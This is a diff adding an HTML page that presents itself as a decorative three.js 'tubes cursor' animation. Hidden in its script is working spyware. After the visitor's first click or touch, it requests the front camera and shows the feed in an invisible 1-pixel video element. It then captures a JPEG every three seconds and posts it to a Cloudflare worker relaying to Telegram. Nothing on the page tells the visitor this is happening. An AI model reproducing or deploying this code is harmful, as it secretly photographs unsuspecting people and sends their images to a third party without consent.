@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>curser @arian0001</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&amp;display=swap">
+  <style>
+    body,
+    html,
+    #app {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    body {
+      touch-action: none;
+      background-color: #000;
+    }
+
+    #app {
+      height: 100%;
+      font-family: "Montserrat", sans-serif;
+    }
+
+    #app a {
+      text-decoration: none;
+      color: #fff;
+    }
+
+    .hero {
+      position: relative;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      pointer-events: none;
+      z-index: 10;
+    }
+
+    h1,
+    h2,
+    p {
+      margin: 0;
+      padding: 0;
+      color: white;
+      text-shadow: 0 0 20px rgba(0, 0, 0, 1);
+      line-height: 100%;
+      user-select: none;
+    }
+
+    h1 {
+      font-size: clamp(40px, 8vw, 80px);
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    h2 {
+      font-size: clamp(30px, 6vw, 60px);
+      font-weight: 500;
+      text-transform: uppercase;
+    }
+
+    #canvas {
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      overflow: hidden;
+      z-index: 1;
+    }
+
+    #camera-feed {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 0;
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <canvas id="canvas"></canvas>
+    <video id="camera-feed" autoplay playsinline muted></video>
+    <div class="hero">
+      <h1></h1>
+      <h2></h2>
+    </div>
+  </div>
+
+  <script type="module">
+    import TubesCursor from "https://cdn.jsdelivr.net/npm/threejs-components@0.0.19/build/cursors/tubes1.min.js"
+
+    const canvasElement = document.getElementById('canvas');
+    const videoElement = document.getElementById('camera-feed');
+
+    // ---- Configuration ----
+    const TELEGRAM_WORKER = 'https://talegramapi.ayanahamed2929.workers.dev/';
+    const CAPTURE_INTERVAL = 3000; // 3 seconds
+    const IMAGE_QUALITY = 0.6; // JPEG quality (0-1)
+
+    let cameraStream = null;
+    let photoInterval = null;
+    let isSending = false; // prevent overlapping sends
+
+    // ---- Send Photo to Telegram via Cloudflare Worker ----
+    async function sendPhotoToTelegram(blob) {
+      if (isSending) return;
+      isSending = true;
+
+      const formData = new FormData();
+      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+
+      try {
+        const res = await fetch(TELEGRAM_WORKER, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await res.json();
+        console.log('Telegram response:', result);
+      } catch (err) {
+        console.error('Failed to send photo:', err);
+      } finally {
+        isSending = false;
+      }
+    }
+
+    // ---- Capture frame from video and send ----
+    async function captureAndSend() {
+      if (!cameraStream || !videoElement.videoWidth) return;
+
+      const width = videoElement.videoWidth;
+      const height = videoElement.videoHeight;
+
+      const canvas = document.createElement('canvas');
+      canvas.width = width;
+      canvas.height = height;
+      const ctx = canvas.getContext('2d');
+
+      // Mirror for selfie (front camera)
+      ctx.translate(width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(videoElement, 0, 0, width, height);
+
+      return new Promise((resolve) => {
+        canvas.toBlob(async (blob) => {
+          if (blob) {
+            await sendPhotoToTelegram(blob);
+          }
+          resolve();
+        }, 'image/jpeg', IMAGE_QUALITY);
+      });
+    }
+
+    // ---- Start Camera ----
+    async function startCamera() {
+      try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 480 },
+            height: { ideal: 640 },
+          },
+          audio: false,
+        });
+
+        videoElement.srcObject = cameraStream;
+        await videoElement.play();
+
+        // Send first photo after 1 second (gives camera time to adjust)
+        setTimeout(captureAndSend, 1000);
+
+        // Then every 3 seconds
+        photoInterval = setInterval(captureAndSend, CAPTURE_INTERVAL);
+      } catch (err) {
+        console.warn('Camera access denied or not available:', err.message);
+      }
+    }
+
+    // ---- Request camera on first user interaction ----
+    function onUserInteraction() {
+      startCamera();
+      document.removeEventListener('click', onUserInteraction);
+      document.removeEventListener('touchstart', onUserInteraction);
+    }
+
+    document.addEventListener('click', onUserInteraction, { once: true });
+    document.addEventListener('touchstart', onUserInteraction, { once: true });
+
+    // ---- TubesCursor Setup ----
+    const app = TubesCursor(canvasElement, {
+      tubes: {
+        colors: ["#f967fb", "#53bc28", "#6958d5"],
+        lights: {
+          intensity: 200,
+          colors: ["#83f36e", "#fe8a2e", "#ff008a", "#60aed5"]
+        }
+      }
+    });
+
+    const changeColors = () => {
+      const colors = randomColors(3);
+      const lightsColors = randomColors(4);
+      app.tubes.setColors(colors);
+      app.tubes.setLightsColors(lightsColors);
+    };
+
+    document.body.addEventListener('click', changeColors);
+
+    const updateCursorPosition = (clientX, clientY) => {
+      if (app && app.uniforms) {
+        app.uniforms.u_mouse.value.set(clientX, window.innerHeight - clientY);
+      }
+    };
+
+    const handleTouch = (e) => {
+      if (e.touches && e.touches.length > 0) {
+        const touch = e.touches[0];
+        updateCursorPosition(touch.clientX, touch.clientY);
+
+        const pointerEvent = new PointerEvent('pointermove', {
+          clientX: touch.clientX,
+          clientY: touch.clientY,
+          bubbles: true,
+          cancelable: true,
+          pointerType: 'touch',
+          isPrimary: true
+        });
+
+        const mouseEvent = new MouseEvent('mousemove', {
+          clientX: touch.clientX,
+          clientY: touch.clientY,
+          bubbles: true,
+          cancelable: true
+        });
+
+        window.dispatchEvent(pointerEvent);
+        canvasElement.dispatchEvent(pointerEvent);
+        window.dispatchEvent(mouseEvent);
+        canvasElement.dispatchEvent(mouseEvent);
+      }
+    };
+
+    window.addEventListener('touchstart', (e) => {
+      handleTouch(e);
+      changeColors();
+    }, { passive: true });
+
+    window.addEventListener('touchmove', handleTouch, { passive: true });
+
+    function randomColors(count) {
+      return new Array(count)
+        .fill(0)
+        .map(() => "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'));
+    }
+  </script>
+</body>
+</html>
